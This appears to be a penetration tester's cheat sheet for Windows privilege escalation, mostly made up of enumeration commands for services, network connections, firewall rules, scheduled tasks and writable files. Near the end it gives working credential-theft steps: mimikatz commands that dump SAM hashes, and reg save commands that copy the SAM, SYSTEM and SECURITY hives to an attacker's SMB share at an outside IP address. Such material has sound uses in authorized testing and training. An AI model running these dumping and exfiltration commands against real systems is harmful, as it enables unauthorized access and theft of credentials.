---
title: Windows_PE
permalink: /Windows/PE
---
third-party driver exploits are more common. As such, we should always attempt to investigate this attack surface first before resorting to more difficult attacks.


## Use directory
```c:\windows\system32\spool\drivers\color\```

## Basic Infos  
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

## to find credentials ##  
https://guif.re/windowseop#EoP%203:%20ClearText%20passwords%20(quick%20hits)

## get most recent files ##

```PS > Get-ChildItem C:\ -Recurse | sort-Object -Descending -Property LastWriteTime | select -First 100```

## List Running Services

```C:\Users\student>tasklist /SVC```


## See if JuicyPotato can be used
```whoami /priv````


#Enumerating Networking Information
```C:\Users\student>ipconfig /all```
#get network routing tables
```C:\Users\student>route print```


## View active network connections
```C:\Users\student>netstat -ano```
```C:\>netstat -ano | findstr TCP | findstr ":0"```

## Then
``C:\>tasklist /v | findstr <pid>``

# Powershell alternative
``C:\powershell -c "Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess"``
#then searchsploit the process
#to search the found executable
``where /R C:\Users CloudMe*``

## inspect firewall
```C:\Users\student>netsh advfirewall show currentprofile```
#list firewall rules
```C:\Users\student>netsh advfirewall firewall show rule name=all```

## Enumerating scheduled tasks  
```c:\Users\student>schtasks /query /fo LIST /v```

## List drives (not seen by winPEAS)
```wmic logicaldisk get deviceid, volumename, description```  
```net shares```  
```powershell -c get-psdrive -psprovider filesystem```

## Get readable files and directories
```accesschk.exe -uws "Everyone" "C:\Program Files"```
```PS C:> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}```  

#to see if a user can be accessed through Evil-WinRM
```c:>net user robisl | findstr "Remote Management Use"```

```c:\Users\student>mountvol```

#analyze systeminfo
```./windows-exploit-suggester.py --update```
```./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt``` 

#Enumerating Binaries That AutoElevate
```c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer```  
```c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer```


To dump hash. Local Admin required
```mimikatz.exe  
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam```

 Dump hash via smb. Only if already admin of the machine
```kali>smbserver.py share . -smb2support -username df -password df```
```net use \\10.10.14.24\share /u:df df```
```reg save HKLM\sam \\10.10.14.24\share\sam```
```reg save HKLM\system \\10.10.14.24\share\system```
```reg save HKLM\security \\10.10.14.24\share\security```

## To execute command as administrator, once password is obtained ##   
```C:\>$user = "Administrator"``` 
```C:\>$pwd = ConvertTo-SecureString "MyP@55w0rd" -AsPlainText -Force```  
```C:\>$cred = New-Object System.Management.Automation.PSCredential($user,$pwd)```  
```C:\> runas /user:Administrator "C:\Windows\System32\cmd.exe```
